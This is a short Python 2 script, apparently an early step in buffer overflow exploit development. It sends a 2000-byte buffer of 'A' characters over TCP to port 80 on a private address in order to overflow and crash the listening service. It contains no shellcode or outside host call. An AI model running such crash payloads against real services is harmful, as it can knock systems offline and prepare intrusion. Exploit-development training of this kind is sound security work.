#!/usr/bin/python
import socket

try:
  print "\nSending buffer."

  buffer = "A" * 2000
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("172.16.1.1", 80))
  s.send(buffer)
  
  s.close()
  
  print "\nSuccess."
  
except:
  print "\nConnection Failed."
